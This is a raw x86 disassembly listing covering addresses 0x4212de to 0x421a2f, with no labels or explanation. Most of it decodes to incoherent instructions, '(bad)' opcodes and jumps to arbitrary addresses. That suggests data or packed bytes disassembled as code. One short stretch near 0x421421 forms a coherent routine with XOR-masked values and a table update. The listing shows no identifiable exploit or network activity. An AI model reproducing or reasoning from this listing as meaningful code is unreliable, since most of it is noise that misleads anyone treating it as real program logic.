  4212de:	fistp  DWORD PTR [ebp-0x5e]
  4212e1:	dec    ebp
  4212e2:	pop    ds
  4212e3:	loopne 0x42131f
  4212e5:	fisub  WORD PTR [esi]
  4212e7:	aas    
  4212e8:	pop    edi
  4212e9:	jecxz  0x4212df
  4212eb:	daa    
  4212ec:	xchg   ecx,eax
  4212ed:	xor    cl,BYTE PTR [edx+ebp*2-0x4148e4e2]
  4212f4:	xchg   edi,eax
  4212f5:	mov    gs,WORD PTR [ebx]
  4212f7:	jp     0x4212b5
  4212f9:	jmp    0x7e9604ec
  4212fe:	add    ebx,DWORD PTR [edx]
  421300:	ins    DWORD PTR es:[edi],dx
  421301:	push   DWORD PTR [esi+0x43]
  421304:	inc    ebx
  421305:	idiv   BYTE PTR [ebp-0x7c]
  421308:	js     0x421372
  42130a:	fimul  DWORD PTR [ebx-0x2e986c59]
  421310:	stos   DWORD PTR es:[edi],eax
  421311:	push   0x7b
  421313:	xchg   DWORD PTR [esi+0x12453da3],ebp
  421319:	xor    BYTE PTR [ecx],0x52
  42131c:	jge    0x42134e
  42131e:	cmp    BYTE PTR ds:0xf1b05f38,0x31
  421325:	mov    bh,0x2
  421327:	inc    ebp
  421328:	clc    
  421329:	pop    esi
  42132a:	fwait
  42132b:	inc    esp
  42132c:	push   esp
  42132d:	dec    esp
  42132e:	jo     0x421320
  421330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421331:	mov    edi,ebx
  421333:	ror    bh,1
  421335:	jo     0x42134e
  421337:	sub    dh,bh
  421339:	popf   
  42133a:	cdq    
  42133b:	add    ebp,ebx
  42133d:	fnstsw WORD PTR [edx+0x4a]
  421340:	outs   dx,BYTE PTR ds:[esi]
  421341:	ret    
  421342:	out    dx,eax
  421343:	dec    BYTE PTR [ecx-0x5d2817b2]
  421349:	daa    
  42134a:	dec    ebx
  42134b:	in     eax,dx
  42134c:	or     BYTE PTR [esi],bl
  42134e:	test   BYTE PTR [ebx+0x517f8d01],ah
  421354:	imul   DWORD PTR [eax+0x4c]
  421357:	pushf  
  421358:	xor    al,0x4b
  42135a:	xlat   BYTE PTR ds:[ebx]
  42135b:	aas    
  42135c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42135d:	add    bl,dl
  42135f:	dec    ecx
  421360:	mov    ch,0xd8
  421362:	mov    fs,WORD PTR [ebx-0x35f9b204]
  421368:	pop    ss
  421369:	or     al,0xd3
  42136b:	mov    ecx,0x6ccb9456
  421370:	adc    cl,BYTE PTR [esi-0x4ab86ac3]
  421376:	push   edx
  421377:	sbb    al,0xa8
  421379:	mov    edx,0x20af1fc0
  42137e:	inc    edx
  42137f:	loop   0x4213fc
  421381:	pop    ebp
  421382:	inc    edi
  421383:	popf   
  421384:	push   0x3ab03191
  421389:	gs pop ebp
  42138b:	fist   DWORD PTR [edi-0x74]
  42138e:	push   es
  42138f:	jp     0x42136e
  421391:	add    al,0xdd
  421393:	or     BYTE PTR [edx+0x1a074178],bh
  421399:	push   edx
  42139a:	shl    DWORD PTR [eax+0x75b5a1e8],0xde
  4213a1:	or     ch,BYTE PTR [edx+0x20fda323]
  4213a7:	lock shr dl,cl
  4213aa:	sbb    al,0xdb
  4213ac:	sub    DWORD PTR [esi-0x3f],esi
  4213af:	cmp    al,BYTE PTR [edi+0xc]
  4213b2:	jle    0x421431
  4213b4:	std    
  4213b5:	int    0xd8
  4213b7:	cwde   
  4213b8:	shl    dh,0x32
  4213bb:	clc    
  4213bc:	pop    ss
  4213bd:	jo     0x42135b
  4213bf:	adc    al,0xb7
  4213c1:	mov    DWORD PTR [ecx-0x6a],0x91a599b
  4213c8:	cmp    DWORD PTR [esi],eax
  4213ca:	test   BYTE PTR [esi],ah
  4213cc:	xchg   esp,eax
  4213cd:	imul   edx,DWORD PTR [ecx],0x4b
  4213d0:	xchg   edi,eax
  4213d1:	das    
  4213d2:	stc    
  4213d3:	push   ebp
  4213d4:	push   esp
  4213d5:	lods   al,BYTE PTR ds:[esi]
  4213d6:	sub    esi,DWORD PTR [edi]
  4213d8:	(bad)  
  4213d9:	xchg   esi,eax
  4213da:	scas   eax,DWORD PTR es:[edi]
  4213db:	retf   
  4213dc:	in     al,0xee
  4213de:	scas   eax,DWORD PTR es:[edi]
  4213df:	scas   al,BYTE PTR es:[edi]
  4213e0:	js     0x4213c1
  4213e2:	dec    esi
  4213e3:	jmp    0xecd3:0xd9b6db96
  4213ea:	or     DWORD PTR [bp+di-0x7f],0xffffffd0
  4213ef:	sbb    ebx,edx
  4213f1:	sahf   
  4213f2:	aad    0x11
  4213f4:	dec    edi
  4213f5:	mov    ch,0x60
  4213f7:	clc    
  4213f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213f9:	loope  0x4213b5
  4213fb:	shl    DWORD PTR [esi],0xcb
  4213fe:	fnstcw WORD PTR [ebx+ebp*8]
  421401:	sub    eax,0x677e4daa
  421406:	loope  0x421455
  421408:	stc    
  421409:	(bad)  
  42140a:	ds pop esi
  42140c:	bound  edi,QWORD PTR [edi+0x84d8b73]
  421412:	xor    ecx,eax
  421414:	add    ecx,esi
  421416:	jne    0x41f07f
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xab7588e2
  42147c:	sbb    eax,0x1cd770b
  421481:	add    BYTE PTR [edx+0x0],ah
  421484:	add    BYTE PTR [eax],al
  421486:	gs xor eax,0x97c09bc3
  42148c:	pop    ebx
  42148d:	mov    eax,ds:0xbcd6527f
  421492:	mov    bl,dl
  421494:	inc    edi
  421495:	into   
  421496:	repz mov dh,0x91
  421499:	sbb    DWORD PTR [ebx],ecx
  42149b:	cdq    
  42149c:	and    ch,BYTE PTR [esi+0x22660b4f]
  4214a2:	neg    DWORD PTR [eax]
  4214a4:	mov    WORD PTR [esp+eax*4],cs
  4214a7:	mov    ecx,0xecdf0b01
  4214ac:	das    
  4214ad:	mov    ah,0x4a
  4214af:	mov    ds:0x27ad4f73,eax
  4214b4:	sbb    ebx,ebx
  4214b6:	pusha  
  4214b7:	sbb    BYTE PTR [eax-0x6df762d2],0xe9
  4214be:	mov    dl,0xaa
  4214c0:	(bad)  
  4214c1:	dec    edi
  4214c2:	inc    eax
  4214c3:	cdq    
  4214c4:	or     al,0x90
  4214c6:	imul   esp,DWORD PTR [ecx],0x6f
  4214c9:	pop    esp
  4214ca:	cwde   
  4214cb:	add    eax,0x7246516e
  4214d0:	loopne 0x4214a0
  4214d2:	aad    0xa5
  4214d4:	mov    ebp,0xf24e59e9
  4214d9:	mov    bh,0x1b
  4214db:	mov    BYTE PTR [esi-0x37],bl
  4214de:	cli    
  4214df:	lods   al,BYTE PTR ds:[esi]
  4214e0:	adc    DWORD PTR [eax],0x43c0f217
  4214e6:	ds cmp al,0x0
  4214e9:	add    BYTE PTR [eax],al
  4214eb:	add    BYTE PTR [eax],al
  4214ed:	add    cl,dl
  4214ef:	sub    al,0x14
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0x41ab8e13
  4214fe:	fxch   st(5)
  421500:	add    DWORD PTR [eax],eax
  421502:	bound  eax,QWORD PTR [eax]
  421504:	add    BYTE PTR [eax],al
  421506:	nop
  421507:	ret    0xa202
  42150a:	and    ch,BYTE PTR [edi-0x89a5fa2]
  421510:	add    al,0x81
  421512:	arpl   WORD PTR [esi+0x9],dx
  421515:	dec    esi
  421516:	pushf  
  421517:	xchg   ebx,eax
  421518:	pop    eax
  421519:	(bad)  
  42151a:	popf   
  42151b:	imul   ebp,ecx,0xffffffb1
  42151e:	fisub  DWORD PTR [eax+ebx*2-0x4e]
  421522:	jmp    0x4215a2
  421524:	cmp    eax,0x9b95ff68
  421529:	fimul  WORD PTR [esp+eax*2+0x73]
  42152d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42152e:	jnp    0x4214e5
  421530:	retf   
  421531:	or     eax,0x4a062778
  421536:	cli    
  421537:	div    BYTE PTR [esi-0x3cf215a2]
  42153d:	stos   DWORD PTR es:[edi],eax
  42153e:	ins    DWORD PTR es:[edi],dx
  42153f:	cwde   
  421540:	add    BYTE PTR [ebp+0x2e],ch
  421543:	rcr    DWORD PTR [ecx],1
  421545:	retf   
  421546:	inc    ecx
  421547:	inc    edi
  421548:	scas   al,BYTE PTR es:[edi]
  421549:	xchg   ebx,eax
  42154a:	stos   DWORD PTR es:[edi],eax
  42154b:	fbld   TBYTE PTR [edx-0x7c]
  42154e:	mov    al,ds:0xf9b410a6
  421553:	sub    cl,ch
  421555:	jecxz  0x421507
  421557:	into   
  421558:	pop    ecx
  421559:	inc    ebx
  42155a:	push   ds
  42155b:	and    al,0xe9
  42155d:	ret    
  42155e:	fimul  WORD PTR [esi*4+0x21d20c52]
  421565:	mov    al,0x6b
  421567:	dec    ebp
  421568:	add    BYTE PTR [eax],al
  42156a:	add    BYTE PTR [eax],al
  42156c:	add    BYTE PTR [eax],al
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2+0x797e3124],0x3b
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	bound  eax,QWORD PTR [eax]
  421584:	add    BYTE PTR [eax],al
  421586:	and    eax,eax
  421588:	sub    BYTE PTR [ebp-0x5e5fbb38],bh
  42158e:	fucom  st(1)
  421590:	and    dh,BYTE PTR [eax]
  421592:	pop    ebp
  421593:	jns    0x421534
  421595:	popf   
  421596:	(bad)  
  421597:	pop    si
  421599:	stos   BYTE PTR es:[edi],al
  42159a:	dec    edi
  42159b:	(bad)  
  42159c:	cli    
  42159d:	stos   DWORD PTR es:[edi],eax
  42159e:	push   cs
  42159f:	and    BYTE PTR [ebx],cl
  4215a1:	idiv   BYTE PTR [edi+ecx*8]
  4215a4:	and    eax,0x273176bf
  4215a9:	xchg   esp,eax
  4215aa:	jnp    0x421536
  4215ac:	cmp    BYTE PTR [esi],bl
  4215ae:	call   0xbc5ae6f7
  4215b3:	mov    ch,ah
  4215b5:	dec    eax
  4215b6:	fstp   QWORD PTR ds:0x57edf0fb
  4215bc:	sub    al,0xce
  4215be:	sub    esp,eax
  4215c0:	lods   eax,DWORD PTR ds:[esi]
  4215c1:	popa   
  4215c2:	pop    ss
  4215c3:	fnstenv [esi+0x4f]
  4215c6:	adc    ah,BYTE PTR [eax+0x436c416c]
  4215cc:	imul   eax,DWORD PTR [eax-0x12],0x28
  4215d0:	dec    eax
  4215d1:	sti    
  4215d2:	adc    al,0x10
  4215d4:	scas   eax,DWORD PTR es:[edi]
  4215d5:	cs ds loop 0x42164a
  4215d9:	jne    0x42161d
  4215db:	neg    BYTE PTR [eax]
  4215dd:	cmp    DWORD PTR [ecx],0xd151cbaa
  4215e3:	std    
  4215e4:	jae    0x4215bf
  4215e6:	jmp    0x4215b2
  4215e8:	add    BYTE PTR [eax],al
  4215ea:	add    BYTE PTR [eax],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	das    
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	mov    esp,DWORD PTR [ebp-0x31627dc2]
  421600:	add    DWORD PTR [eax],eax
  421602:	bound  eax,QWORD PTR [eax]
  421604:	add    BYTE PTR [eax],al
  421606:	sub    ah,dh
  421608:	(bad)  
  421609:	je     0x4215ee
  42160b:	xor    edx,edx
  42160d:	sti    
  42160e:	test   ah,ch
  421610:	clc    
  421611:	adc    al,0x4e
  421613:	mov    ah,0x1d
  421615:	jno    0x4215d6
  421617:	xor    eax,0xd130866f
  42161c:	adc    eax,0x1212a7f6
  421621:	cmp    esi,0xf4544323
  421627:	fcomip st,st(7)
  421629:	inc    ebp
  42162a:	xchg   esi,eax
  42162b:	push   es
  42162c:	jb     0x4215f5
  42162e:	scas   eax,DWORD PTR es:[edi]
  42162f:	xchg   edx,eax
  421630:	js     0x421657
  421632:	fimul  DWORD PTR [edi+0x278e0119]
  421638:	push   ds
  421639:	outs   dx,BYTE PTR ds:[esi]
  42163a:	sbb    ebx,DWORD PTR [ebx]
  42163c:	test   ch,0xd9
  42163f:	adc    edx,DWORD PTR [edx-0x43]
  421642:	lods   al,BYTE PTR ds:[esi]
  421643:	repz pop ebx
  421645:	dec    edx
  421646:	push   es
  421647:	xchg   esi,eax
  421648:	push   ebp
  421649:	cmp    eax,DWORD PTR [ecx+eax*8+0xde93b60]
  421650:	loope  0x421604
  421652:	push   ds
  421653:	cli    
  421654:	adc    al,0xc5
  421656:	in     eax,0x1b
  421658:	test   bl,dh
  42165a:	frstor [edi]
  42165c:	int    0xc9
  42165e:	sahf   
  42165f:	jecxz  0x421685
  421661:	adc    eax,0x8a2ec2da
  421666:	rol    DWORD PTR [esi+0x0],1
  42166c:	add    BYTE PTR [eax],al
  42166e:	retf   0x76a0
  421671:	dec    ebp
  421672:	jle    0x421653
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0xd9f6fb05,al
  42167e:	dec    esi
  421680:	add    DWORD PTR [eax],eax
  421682:	bound  eax,QWORD PTR [eax]
  421684:	add    BYTE PTR [eax],al
  421686:	mov    esi,0x99365c7c
  42168b:	push   edx
  42168c:	push   edi
  42168d:	mov    ch,0x44
  42168f:	pop    eax
  421690:	sub    edi,edx
  421692:	and    dh,al
  421694:	in     al,0xcf
  421696:	pushf  
  421697:	lods   eax,DWORD PTR ds:[esi]
  421698:	(bad)  
  42169a:	jo     0x421677
  42169c:	lods   al,BYTE PTR ds:[esi]
  42169d:	or     esp,DWORD PTR ds:0x56df0f26
  4216a3:	xor    eax,0x65ec4b4d
  4216a8:	ret    0x5b75
  4216ab:	mov    ecx,0x1db1a792
  4216b0:	sub    DWORD PTR [ebx-0x5e],ecx
  4216b3:	jae    0x4216b7
  4216b5:	stc    
  4216b6:	adc    bh,al
  4216b8:	(bad)  
  4216b9:	ret    
  4216ba:	mov    ecx,0xcdde7596
  4216bf:	cmp    BYTE PTR [esi+0x4d9957c3],al
  4216c5:	mov    ebx,0xcc0181f5
  4216ca:	test   BYTE PTR [ebx-0x38],bh
  4216cd:	adc    BYTE PTR [edi],dl
  4216cf:	fcmovnb st,st(2)
  4216d1:	es xchg edi,eax
  4216d3:	fsqrt  
  4216d5:	fbstp  TBYTE PTR [esi]
  4216d7:	dec    edi
  4216d8:	inc    ebp
  4216d9:	add    BYTE PTR [eax+0x42cda07c],bh
  4216df:	test   al,0x8b
  4216e1:	mov    WORD PTR [ebp+eax*2-0x4e],fs
  4216e5:	inc    ebp
  4216e6:	aad    0xde
  4216e8:	add    BYTE PTR [eax],al
  4216ea:	add    BYTE PTR [eax],al
  4216ec:	add    BYTE PTR [eax],al
  4216ee:	(bad)  
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	mov    ds:0x6114f145,eax
  4216ff:	iret   
  421700:	add    DWORD PTR [eax],eax
  421702:	bound  eax,QWORD PTR [eax]
  421704:	add    BYTE PTR [eax],al
  421706:	push   edi
  421707:	mov    DWORD PTR [edi-0x103684a9],esp
  42170d:	retf   
  42170e:	pushf  
  42170f:	test   DWORD PTR ss:[ebp+0x41],0x676ff825
  421717:	mov    ah,0xd1
  421719:	imul   ecx,DWORD PTR [edi],0xffffffa7
  42171c:	or     eax,0xe7325437
  421721:	gs pop ebp
  421723:	push   ebx
  421724:	sar    BYTE PTR [edx+0xe],0x3a
  421728:	or     BYTE PTR [ebp+0x134d8ea6],bl
  42172e:	clc    
  42172f:	push   ebx
  421730:	scas   al,BYTE PTR es:[edi]
  421731:	pop    ecx
  421732:	inc    edx
  421733:	sbb    DWORD PTR [esp+edi*8+0x55],ebp
  421737:	cmp    eax,0xcf9f155
  42173c:	jmp    0x421768
  42173e:	dec    esp
  42173f:	jae    0x421773
  421741:	xor    eax,0x6701be86
  421746:	shl    BYTE PTR [ecx+0x11a046db],1
  42174c:	pop    eax
  42174d:	ja     0x4216e5
  42174f:	repz add BYTE PTR [ebx+0x7ba70af0],ah
  421756:	loopne 0x4216e6
  421758:	push   esp
  421759:	cmp    eax,0xdf3ebbef
  42175e:	jne    0x4216fc
  421760:	pop    eax
  421761:	or     DWORD PTR [edi],ebp
  421763:	int3   
  421764:	inc    edx
  421765:	rcl    DWORD PTR [esp+eax*1+0x0],cl
  42176c:	add    BYTE PTR [eax],al
  42176e:	push   edx
  42176f:	xor    al,0x40
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0xa6a4e09
  42177b:	mov    cl,0x6a
  42177d:	mov    eax,ds:0x1cfc3
  421782:	bound  eax,QWORD PTR [eax]
  421784:	add    BYTE PTR [eax],al
  421786:	cmp    eax,0xc2a902b8
  42178b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42178c:	rol    BYTE PTR [eax-0xa535125],0x15
  421793:	es dec edi
  421795:	dec    esi
  421796:	xlat   BYTE PTR ds:[ebx]
  421797:	mov    eax,0x161a8c5a
  42179c:	sub    al,0x98
  42179e:	ins    BYTE PTR es:[edi],dx
  42179f:	out    dx,al
  4217a0:	outs   dx,DWORD PTR ds:[esi]
  4217a1:	leave  
  4217a2:	or     ch,BYTE PTR [ebp-0x55]
  4217a5:	in     al,dx
  4217a6:	jp     0x4217fa
  4217a8:	fwait
  4217a9:	mov    edx,gs
  4217ab:	aad    0x79
  4217ad:	and    dh,BYTE PTR [ecx]
  4217af:	arpl   WORD PTR [ebx-0x15a43153],dx
  4217b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217b6:	leave  
  4217b7:	jg     0x4217f7
  4217b9:	mov    ah,0x31
  4217bb:	cld    
  4217bc:	cmc    
  4217bd:	xchg   edx,eax
  4217be:	mov    edx,0xe813e135
  4217c3:	addr16 rol bh,cl
  4217c6:	jmp    0x421758
  4217c8:	es sub al,0x45
  4217cb:	jo     0x4217e7
  4217cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217ce:	xchg   ecx,eax
  4217cf:	jnp    0x4217be
  4217d1:	jl     0x42178e
  4217d3:	adc    al,0x3b
  4217d5:	fwait
  4217d6:	ins    DWORD PTR es:[edi],dx
  4217d7:	adc    al,0xfa
  4217d9:	jae    0x421853
  4217db:	test   eax,0x7b93b26d
  4217e1:	xor    DWORD PTR [edx],edx
  4217e3:	xor    DWORD PTR [edi],ebp
  4217e5:	jae    0x4217a0
  4217e7:	add    al,BYTE PTR [eax]
  4217e9:	add    BYTE PTR [eax],al
  4217eb:	add    BYTE PTR [eax],al
  4217ed:	add    BYTE PTR [ecx+0x46],cl
  4217f0:	sub    BYTE PTR [eax],dh
  4217f2:	das    
  4217f3:	jle    0x42184e
  4217f5:	jg     0x4217bd
  4217f7:	imul   esi,eax,0xffffffd5
  4217fa:	sbb    DWORD PTR [eax+edi*4],edx
  4217fd:	pop    ecx
  4217fe:	out    0xe2,eax
  421800:	add    DWORD PTR [eax],eax
  421802:	bound  eax,QWORD PTR [eax]
  421804:	add    BYTE PTR [eax],al
  421806:	in     eax,dx
  421807:	cdq    
  421808:	icebp  
  421809:	test   al,0x93
  42180b:	gs adc al,0xe7
  42180e:	clc    
  42180f:	jmp    0x42180a
  421811:	mov    ah,0x8c
  421813:	xchg   ebx,eax
  421814:	xor    BYTE PTR [ebp+0x66],0x67
  421818:	shr    DWORD PTR [esi+0x2d15ea17],0xe
  42181f:	push   0x59dc6f88
  421824:	cmp    bl,bl
  421826:	xor    esi,DWORD PTR [edi-0x196c3efb]
  42182c:	scas   eax,DWORD PTR es:[edi]
  42182d:	push   ebx
  42182e:	fimul  WORD PTR [esi-0x66]
  421831:	aad    0x82
  421833:	inc    esi
  421834:	in     eax,dx
  421835:	stos   BYTE PTR es:[edi],al
  421836:	pop    ebp
  421837:	frstor [ebx+0x22ed129a]
  42183d:	(bad)  
  42183f:	mov    cl,0x1b
  421841:	push   es
  421842:	dec    edi
  421843:	fcomi  st,st(5)
  421845:	in     eax,dx
  421846:	ds int 0x53
  421849:	in     eax,dx
  42184a:	mov    dl,BYTE PTR [eax]
  42184c:	and    DWORD PTR [eax],0xffffffa1
  42184f:	daa    
  421850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421851:	mov    eax,0x4b916dfe
  421856:	sbb    DWORD PTR [edx+0x26],esi
  421859:	pop    esi
  42185a:	(bad)  
  42185b:	ins    BYTE PTR es:[edi],dx
  42185c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42185d:	dec    edi
  42185e:	or     eax,0xe2ae18fa
  421863:	(bad)  
  421864:	pop    edi
  421865:	sbb    ecx,DWORD PTR [edi+0xfb]
  42186b:	add    BYTE PTR [eax],al
  42186d:	add    BYTE PTR [edi-0x3a],ah
  421870:	and    dh,dh
  421872:	mov    eax,ds:0xe7d7f7f6
  421877:	mov    eax,0xcb9dda72
  42187c:	(bad)  
  42187d:	mov    al,0x49
  42187f:	jecxz  0x421882
  421881:	add    BYTE PTR [edx+0x0],ah
  421884:	add    BYTE PTR [eax],al
  421886:	adc    ebp,DWORD PTR [eax+ecx*4+0x30]
  42188a:	out    dx,al
  42188b:	into   
  42188c:	(bad)  
  42188d:	je     0x4218c9
  42188f:	ja     0x4218cb
  421891:	add    al,0xac
  421893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421894:	sti    
  421895:	jp     0x4218fa
  421897:	inc    edi
  421898:	hlt    
  421899:	sub    BYTE PTR [ebx+0x75],dl
  42189c:	mov    DWORD PTR [ebx+0x55],esi
  42189f:	fdiv   QWORD PTR [ecx+0x48]
  4218a2:	ret    
  4218a3:	clc    
  4218a4:	mov    ecx,0x69dba518
  4218a9:	les    edi,FWORD PTR [esi-0x60]
  4218ac:	mov    BYTE PTR [esi+0x50],ch
  4218af:	adc    eax,0x85367b2c
  4218b4:	ds pop ebx
  4218b6:	in     al,0x59
  4218b8:	ficom  WORD PTR [esi+eax*4]
  4218bb:	sbb    ah,dh
  4218bd:	out    0x9a,al
  4218bf:	mov    ?,WORD PTR [ecx]
  4218c1:	rol    DWORD PTR ds:0xcdb1ba5d,0x8e
  4218c8:	cmc    
  4218c9:	out    dx,eax
  4218ca:	pop    edi
  4218cb:	jle    0x421899
  4218cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218ce:	push   0xffffffd0
  4218d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218d1:	add    dl,bh
  4218d3:	xchg   DWORD PTR [ecx],esi
  4218d5:	call   0xd7ab:0x32f44940
  4218dc:	inc    esp
  4218dd:	xchg   ecx,eax
  4218de:	xchg   ebx,eax
  4218df:	in     al,dx
  4218e0:	retf   
  4218e1:	pop    es
  4218e2:	xchg   BYTE PTR [ebx-0x32ef4d32],bl
  4218e8:	add    BYTE PTR [eax],al
  4218ea:	add    BYTE PTR [eax],al
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	ret    
  4218ef:	or     eax,0xefee66a6
  4218f4:	ret    
  4218f5:	lods   eax,DWORD PTR ds:[esi]
  4218f6:	sub    al,0xb8
  4218f8:	mov    ds:0x9c8c3647,eax
  4218fd:	daa    
  4218fe:	stos   DWORD PTR es:[edi],eax
  4218ff:	jecxz  0x421902
  421901:	add    BYTE PTR [edx+0x0],ah
  421904:	add    BYTE PTR [eax],al
  421906:	mov    esp,0xa8b290cd
  42190b:	aam    0xe
  42190d:	mov    dl,0x8c
  42190f:	jmp    0x4218a5
  421911:	jecxz  0x42198c
  421913:	push   ss
  421914:	cld    
  421915:	lea    eax,[ebp+0x26]
  421918:	xchg   ecx,eax
  421919:	dec    edx
  42191a:	xchg   ecx,eax
  42191b:	inc    eax
  42191c:	xchg   BYTE PTR [esi-0x10494721],dh
  421922:	xor    bh,BYTE PTR [ecx]
  421924:	stos   BYTE PTR es:[edi],al
  421925:	fldpi  
  421927:	fdiv   DWORD PTR [ebx-0x32cad4ec]
  42192d:	(bad)  
  42192e:	jecxz  0x421996
  421930:	fwait
  421931:	stos   BYTE PTR es:[edi],al
  421932:	dec    eax
  421933:	xchg   BYTE PTR [ecx],ch
  421935:	bound  eax,QWORD PTR [ecx-0x4b]
  421938:	push   ebp
  421939:	stc    
  42193a:	in     eax,dx
  42193b:	sti    
  42193c:	ret    0x9d34
  42193f:	sub    eax,0xd03c774e
  421944:	adc    al,0xec
  421946:	inc    edi
  421947:	lea    esp,[ecx+0x3f]
  42194a:	(bad)  
  42194b:	xchg   edi,eax
  42194c:	ret    
  42194d:	fstp   TBYTE PTR [edx-0x431e87c6]
  421953:	andps  xmm6,xmm3
  421956:	and    DWORD PTR ds:0x4ffcbfd8,ebx
  42195c:	xchg   ebx,eax
  42195d:	or     eax,DWORD PTR [ebp+0xfa5de13]
  421963:	mul    DWORD PTR [edx]
  421965:	add    al,0x8b
  421967:	inc    esp
  421968:	add    BYTE PTR [eax],al
  42196a:	add    BYTE PTR [eax],al
  42196c:	add    BYTE PTR [eax],al
  42196e:	fld    st(2)
  421970:	add    eax,0xddcf1f49
  421975:	ror    al,cl
  421977:	outs   dx,DWORD PTR ds:[esi]
  421978:	clc    
  421979:	shr    BYTE PTR [edi+0x56],cl
  42197c:	add    eax,0x1e40d52
  421981:	add    BYTE PTR [edx+0x0],ah
  421984:	add    BYTE PTR [eax],al
  421986:	fimul  WORD PTR [ecx+0x4a]
  421989:	lods   al,BYTE PTR ds:[esi]
  42198a:	ret    0x3e2c
  42198d:	push   edi
  42198e:	fdiv   DWORD PTR [eax]
  421990:	daa    
  421991:	(bad)  
  421992:	mov    eax,ds:0xc0844ec7
  421997:	das    
  421998:	jge    0x42191c
  42199a:	or     edi,DWORD PTR [edi-0x74ce177b]
  4219a0:	cdq    
  4219a1:	jmp    0xca583b41
  4219a6:	scas   eax,DWORD PTR es:[edi]
  4219a7:	scas   eax,DWORD PTR es:[edi]
  4219a8:	push   es
  4219a9:	cmp    BYTE PTR [ecx-0x6c0ad31e],dl
  4219af:	xchg   ebp,eax
  4219b0:	inc    ecx
  4219b1:	mov    bh,0x9c
  4219b3:	sahf   
  4219b4:	sbb    ch,BYTE PTR [ebx-0x38]
  4219b7:	xchg   ecx,eax
  4219b8:	or     al,0x73
  4219ba:	and    al,0xad
  4219bc:	xchg   ebx,eax
  4219bd:	jl     0x421986
  4219bf:	push   edx
  4219c0:	xor    al,BYTE PTR ds:0xe842fe67
  4219c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219c7:	jbe    0x421975
  4219c9:	inc    eax
  4219ca:	inc    edx
  4219cb:	pop    edi
  4219cc:	cmp    esi,ebx
  4219ce:	mov    edi,0x204dcdb4
  4219d3:	ret    
  4219d4:	pushf  
  4219d5:	inc    esi
  4219d6:	pop    esi
  4219d7:	aas    
  4219d8:	push   0x66e826c6
  4219dd:	retf   0x6f6f
  4219e0:	loope  0x421a10
  4219e2:	mov    DWORD PTR [ebp+0x68fe23d5],esp
  4219e8:	add    BYTE PTR [eax],al
  4219ea:	add    BYTE PTR [eax],al
  4219ec:	add    BYTE PTR [eax],al
  4219ee:	popa   
  4219ef:	pop    edi
  4219f0:	lock (bad) 
  4219f2:	(bad)  
  4219f3:	out    dx,eax
  4219f4:	repz pop edi
  4219f6:	mov    dl,0xc5
  4219f8:	ret    
  4219f9:	in     eax,dx
  4219fa:	mov    fs,WORD PTR [edi-0x1b9018ce]
  421a00:	add    DWORD PTR [eax],eax
  421a02:	or     eax,0x12000000
  421a07:	add    DWORD PTR [ebp-0x2234e118],esp
  421a0d:	inc    ch
  421a0f:	add    edi,DWORD PTR [ecx-0x39]
  421a12:	sbb    al,0x0
	...
  421a1c:	add    BYTE PTR [eax],al
  421a1e:	add    BYTE PTR [eax-0x6ffbffbe],dl
  421a24:	inc    edx
  421a25:	add    BYTE PTR [eax],cl
  421a27:	nop
  421a28:	inc    edx
  421a29:	add    BYTE PTR [eax+edx*4],cl
  421a2c:	inc    edx
  421a2d:	add    BYTE PTR [eax],dl
  421a2f:	nop
